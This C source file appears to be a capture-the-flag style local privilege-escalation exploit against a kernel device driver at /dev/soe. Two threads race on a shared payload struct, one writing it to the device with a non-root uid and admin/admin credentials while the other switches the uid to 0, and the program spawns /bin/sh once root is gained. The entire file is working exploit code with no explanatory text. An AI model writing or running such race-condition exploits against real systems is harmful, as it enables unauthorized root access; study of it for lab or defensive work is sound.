#include "libpwn.h"

int root = 0;

struct payload_t {
    uint64_t uid;
    char *username;
    char *password;
} __attribute__((packed));

struct payload_t payload;

void spawn_shell() {
    system("/bin/sh");
}

void *dev_write(){
    int fd;

    while(!root) {
        if (getuid() == 0) {
            root = 1;
            spawn_shell();
        }
        else {
            payload.uid = 0x539;
            payload.username = "admin";
            payload.password = "admin";

            if((fd = open("/dev/soe", O_RDWR)) < 0){
                perror("open");
                exit(1);
            }

            write(fd, &payload, sizeof(payload));

            close(fd);
        }
    }
}

void *ctx_root(){
    while(!root) {
        if(getuid() == 0) {
            root = 1;
            spawn_shell();
        }
        else {
            payload.uid = 0x0;
            payload.username = "admin";
            payload.password = "admin";
        }
    }
}

int main() {
    pthread_t t1, t2;
    pthread_create(&t1, NULL, dev_write, NULL);
    pthread_create(&t2, NULL, ctx_root, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
}
